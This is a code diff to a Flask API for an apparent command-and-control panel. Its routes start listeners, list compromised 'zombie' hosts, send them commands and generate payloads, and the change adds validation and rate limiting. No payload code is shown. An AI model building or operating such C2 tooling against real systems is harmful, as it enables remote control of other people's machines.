@@ -1,14 +1,29 @@
 from flask import Blueprint, jsonify, request, session
+import re
 from handlers.c2_listener import (
     start_listener, stop_listener, stop_all_listeners,
     get_listeners, get_zombies, get_zombie_output,
-    send_command, disconnect_zombie, generate_payload
+    send_command, disconnect_zombie, generate_payload, _validate_ip, _validate_port
 )
 
 c2_bp = Blueprint('c2_routes', __name__)
 
 
 from core.auth import login_required
+
+# FIX: Optional rate-limit decorator for sensitive C2 endpoints
+try:
+    from core.extensions import limiter
+    def rate_limit(limit_str):
+        """Decorator that applies a rate limit only when flask-limiter is available."""
+        def decorator(f):
+            if limiter:
+                return limiter.limit(limit_str)(f)
+            return f
+        return decorator
+except ImportError:
+    def rate_limit(limit_str):
+        return lambda f: f
 
 
 @c2_bp.route('/api/c2/listeners', methods=['GET'])
@@ -19,11 +34,22 @@ def api_get_listeners():
 
 @c2_bp.route('/api/c2/listener/start', methods=['POST'])
 @login_required
+@rate_limit("10 per minute")
 def api_start_listener():
     data = request.get_json()
-    port = data.get('port', 4444)
+    try:
+        port = int(data.get('port', 4444))
+        if not (1 <= port <= 65535):
+            return jsonify({"status": "error", "message": "Port must be 1-65535."})
+    except (ValueError, TypeError):
+        return jsonify({"status": "error", "message": "Invalid port number."})
+
     bind_addr = data.get('bind_addr', '0.0.0.0')
-    name = data.get('name', 'Default Listener')
+    # FIX: Validate IP/bind address format
+    if bind_addr != '0.0.0.0' and not _validate_ip(bind_addr):
+        return jsonify({"status": "error", "message": f"Invalid bind address: {bind_addr}"})
+
+    name = str(data.get('name', 'Default Listener'))[:50]  # FIX: limit name length
     result = start_listener(port, bind_addr, name)
     return jsonify(result)
 
@@ -90,6 +116,7 @@ def api_disconnect_zombie():
 
 @c2_bp.route('/api/c2/payload/generate', methods=['POST'])
 @login_required
+@rate_limit("20 per minute")
 def api_generate_payload():
     data = request.get_json()
     listener_ip = data.get('listener_ip', '')
